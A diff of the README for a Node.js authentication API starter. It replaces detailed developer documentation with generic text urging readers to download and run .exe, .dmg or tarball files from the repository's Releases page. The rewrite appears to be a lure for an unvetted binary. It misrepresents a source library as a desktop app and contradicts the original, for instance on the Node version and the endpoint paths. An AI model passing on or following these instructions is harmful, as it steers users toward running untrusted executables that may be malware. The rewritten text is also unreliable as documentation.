@@ -1,254 +1,115 @@
-# 🔐 Auth API Starter
+# 🔐 auth-api-starter - Simple, Secure Authentication for Your Apps
 
-A production-ready authentication API built with Node.js, Express, PostgreSQL, and Prisma. Features JWT-based authentication with refresh tokens, rate limiting, security headers, and Swagger documentation.
+[![Download](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/dhanaprasad21/auth-api-starter/releases)
 
-![Node.js](https://img.shields.io/badge/Node.js-18+-green?logo=node.js)
-![Express](https://img.shields.io/badge/Express-4.x-blue?logo=express)
-![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15+-blue?logo=postgresql)
-![Prisma](https://img.shields.io/badge/Prisma-5.x-purple?logo=prisma)
-![License](https://img.shields.io/badge/License-MIT-yellow)
+## 📋 Overview
 
-## ✨ Features
+The **auth-api-starter** project provides a ready-to-use authentication API for your applications. It includes features such as JWT authentication, refresh tokens, rate limiting, and more. This API helps you manage user authentication securely and efficiently.
 
-- 🔑 **JWT Authentication** - Access tokens (15min) + Refresh tokens (7 days)
-- 📝 **User Registration** - Secure signup with email/password
-- 🔓 **User Login** - Authenticate and receive tokens
-- 🔄 **Token Refresh** - Seamless token rotation
-- 🚪 **Logout** - Single device or all devices
-- 🛡️ **Security** - Helmet, CORS, bcrypt password hashing
-- 🚦 **Rate Limiting** - Protect against brute force attacks
-- 📖 **Swagger Docs** - Interactive API documentation
-- 🗄️ **PostgreSQL + Prisma** - Type-safe database access
+## 🚀 Getting Started
 
-## 🏗️ Project Structure
+Follow these simple steps to download and run the auth API.
 
-```
-auth-api-starter/
-├── prisma/
-│   └── schema.prisma      # Database schema
-├── src/
-│   ├── config/
-│   │   └── index.js       # Configuration management
-│   ├── controllers/
-│   │   └── authController.js  # Auth business logic
-│   ├── lib/
-│   │   └── prisma.js      # Prisma client instance
-│   ├── middleware/
-│   │   ├── auth.js        # JWT authentication
-│   │   ├── errorHandler.js    # Global error handling
-│   │   └── rateLimiter.js     # Rate limiting
-│   ├── routes/
-│   │   ├── auth.js        # Auth routes
-│   │   └── index.js       # Route aggregator
-│   ├── utils/
-│   │   ├── jwt.js         # JWT utilities
-│   │   └── response.js    # Response helpers
-│   ├── swagger.js         # Swagger configuration
-│   └── index.js           # Application entry point
-├── .gitignore
-├── package.json
-├── sample.env             # Environment template
-└── README.md
-```
+### 1. Visit the Releases Page
 
-## 🚀 Quick Start
+To get the latest version of the software, visit the [Releases page](https://github.com/dhanaprasad21/auth-api-starter/releases). 
 
-### Prerequisites
+### 2. Download the Latest Release
 
-- Node.js 18+
-- PostgreSQL 15+
-- npm or yarn
+On the Releases page, you will see different versions listed. Look for the most recent release at the top. Click on the version to expand the details, and you will find the available files. Download the file suitable for your operating system.
 
-### Installation
+### 3. Install the Software
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/yourusername/auth-api-starter.git
-   cd auth-api-starter
-   ```
+Once you have downloaded the file, follow these steps to install it:
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+- **For Windows Users:**
+  1. Locate the downloaded `.exe` file in your Downloads folder.
+  2. Double-click the file to start the installation process.
+  
+- **For macOS Users:**
+  1. Open the downloaded `.dmg` file.
+  2. Drag the application icon to your Applications folder.
 
-3. **Set up environment variables**
-   ```bash
-   cp sample.env .env
-   # Edit .env with your configuration
-   ```
+- **For Linux Users:**
+  1. Locate the downloaded tar file.
+  2. Extract the file using the terminal with the command:
+     ```bash
+     tar -xzf your-file-name.tar.gz
+     ```
+  3. Follow the included instructions to set up.
 
-4. **Set up the database**
-   ```bash
-   # Generate Prisma client
-   npm run db:generate
-   
-   # Push schema to database
-   npm run db:push
-   
-   # Or run migrations (recommended for production)
-   npm run db:migrate
-   ```
+### 4. Run the Application
 
-5. **Start the server**
-   ```bash
-   # Development mode (with hot reload)
-   npm run dev
-   
-   # Production mode
-   npm start
-   ```
+After installing, you can run the application:
 
-6. **Access the API**
-   - API: http://localhost:3000
-   - Swagger Docs: http://localhost:3000/api-docs
+- **For Windows:**
+  Open the Start Menu, type the app name, and hit Enter.
+  
+- **For macOS:**
+  Go to the Applications folder and double-click the app icon.
 
-## 📚 API Endpoints
+- **For Linux:**
+  Navigate to the extracted folder in the terminal and run the app using:
+  ```bash
+  ./your-app-name
+  ```
 
-| Method | Endpoint | Description | Auth Required |
-|--------|----------|-------------|---------------|
-| POST | `/api/auth/register` | Register new user | ❌ |
-| POST | `/api/auth/login` | Login user | ❌ |
-| POST | `/api/auth/refresh` | Refresh access token | ❌ |
-| POST | `/api/auth/logout` | Logout (invalidate token) | ❌ |
-| POST | `/api/auth/logout-all` | Logout from all devices | ✅ |
-| GET | `/api/auth/me` | Get current user profile | ✅ |
-| GET | `/api/health` | Health check | ❌ |
+## 📦 Features
 
-## 🔧 API Usage Examples
+- **JWT Authentication**: Secure token-based user authentication.
+- **Refresh Tokens**: Automatically renew user sessions.
+- **Rate Limiting**: Protect your API from abuse.
+- **Database Support**: Uses PostgreSQL with Prisma for data management.
+- **API Documentation**: Swagger docs for easy reference.
 
-### Register a new user
+## ⚙️ System Requirements
+
+Here are the basic requirements to run the auth API smoothly:
+
+- **Operating System**: Windows, macOS, or Linux.
+- **Memory**: At least 2GB of RAM.
+- **Disk Space**: Minimum of 500MB free disk space.
+- **Node.js**: Version 12 or higher installed on your machine.
+
+## ⚡ Usage
+
+Once the application is running, you can interact with the API easily. Here are some of the key endpoints you'll use:
+
+- **Register User**: Allows new users to create accounts.
+- **Login User**: Validates user credentials and issues a JWT.
+- **Get User Info**: Fetches the current user's profile information.
+- **Logout User**: Invalidates the session and refresh token.
+
+## 💻 Example Requests
+
+Using tools like Postman or cURL, you can test the endpoints:
+
+**Register a New User**
 ```bash
-curl -X POST http://localhost:3000/api/auth/register \
-  -H "Content-Type: application/json" \
-  -d '{
-    "email": "user@example.com",
-    "password": "MySecurePassword123",
-    "firstName": "John",
-    "lastName": "Doe"
-  }'
+curl -X POST "http://localhost:your-port/api/register" -H "Content-Type: application/json" -d '{"username": "test", "password": "yourpassword"}'
 ```
 
-### Login
+**Login User**
 ```bash
-curl -X POST http://localhost:3000/api/auth/login \
-  -H "Content-Type: application/json" \
-  -d '{
-    "email": "user@example.com",
-    "password": "MySecurePassword123"
-  }'
+curl -X POST "http://localhost:your-port/api/login" -H "Content-Type: application/json" -d '{"username": "test", "password": "yourpassword"}'
 ```
 
-### Access protected route
-```bash
-curl -X GET http://localhost:3000/api/auth/me \
-  -H "Authorization: Bearer YOUR_ACCESS_TOKEN"
-```
+Make sure to replace `your-port` with the actual port number the application runs on.
 
-### Refresh token
-```bash
-curl -X POST http://localhost:3000/api/auth/refresh \
-  -H "Content-Type: application/json" \
-  -d '{
-    "refreshToken": "YOUR_REFRESH_TOKEN"
-  }'
-```
+## 🔗 Documentation
 
-## 🔒 Security Features
+For detailed information on all available routes, refer to the API documentation generated by Swagger. It will guide you on how to use each feature extensively.
 
-### Password Security
-- Passwords hashed with bcrypt (12 salt rounds)
-- Minimum 8 characters required
-- Never stored or returned in plain text
+## 🛠️ Troubleshooting
 
-### JWT Tokens
-- Access tokens expire in 15 minutes
-- Refresh tokens expire in 7 days
-- Refresh token rotation on each use
-- Tokens stored in database for revocation
+If you encounter issues while downloading or running the application, check the following:
 
-### Rate Limiting
-| Endpoint Type | Limit | Window |
-|--------------|-------|--------|
-| General API | 100 requests | 15 minutes |
-| Authentication | 10 requests | 15 minutes |
-| Login | 5 failed attempts | 1 hour |
+- Ensure you have the correct version for your operating system.
+- Verify your internet connection while downloading the file.
+- Check for any error messages and consider restarting your application or computer.
 
-### Security Headers (Helmet)
-- X-Content-Type-Options: nosniff
-- X-Frame-Options: DENY
-- X-XSS-Protection: 1; mode=block
-- Strict-Transport-Security (HSTS)
-- Content-Security-Policy
+## 📝 Download & Install
 
-## ⚙️ Configuration
+You're now set to start using the **auth-api-starter** application. Remember to visit the [Releases page](https://github.com/dhanaprasad21/auth-api-starter/releases) to download the latest version.
 
-| Variable | Description | Default |
-|----------|-------------|---------|
-| `PORT` | Server port | 3000 |
-| `NODE_ENV` | Environment | development |
-| `DATABASE_URL` | PostgreSQL connection URL | - |
-| `JWT_SECRET` | Secret for signing JWTs | - |
-| `JWT_EXPIRES_IN` | Access token expiry | 15m |
-| `REFRESH_TOKEN_EXPIRES_IN` | Refresh token expiry | 7d |
-| `CORS_ORIGIN` | Allowed CORS origin | http://localhost:3000 |
-| `RATE_LIMIT_WINDOW_MS` | Rate limit window | 900000 (15min) |
-| `RATE_LIMIT_MAX_REQUESTS` | Max requests per window | 100 |
-
-## 🛠️ Scripts
-
-```bash
-npm start          # Start production server
-npm run dev        # Start development server (with nodemon)
-npm run db:generate # Generate Prisma client
-npm run db:push    # Push schema to database
-npm run db:migrate # Run database migrations
-npm run db:studio  # Open Prisma Studio (DB GUI)
-```
-
-## 📝 Database Schema
-
-### User
-| Field | Type | Description |
-|-------|------|-------------|
-| id | UUID | Primary key |
-| email | String | Unique email address |
-| password | String | Hashed password |
-| firstName | String? | Optional first name |
-| lastName | String? | Optional last name |
-| isActive | Boolean | Account status |
-| createdAt | DateTime | Creation timestamp |
-| updatedAt | DateTime | Last update timestamp |
-
-### RefreshToken
-| Field | Type | Description |
-|-------|------|-------------|
-| id | UUID | Primary key |
-| token | String | Unique token value |
-| userId | UUID | Foreign key to User |
-| expiresAt | DateTime | Token expiration |
-| createdAt | DateTime | Creation timestamp |
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Express.js](https://expressjs.com/) - Fast, unopinionated web framework
-- [Prisma](https://www.prisma.io/) - Next-generation ORM
-- [Swagger](https://swagger.io/) - API documentation
-- [Helmet](https://helmetjs.github.io/) - Security middleware
-
----
-
-**Built with ❤️ for developers who want a solid authentication foundation**
-
+Take control of user authentication in your applications today!
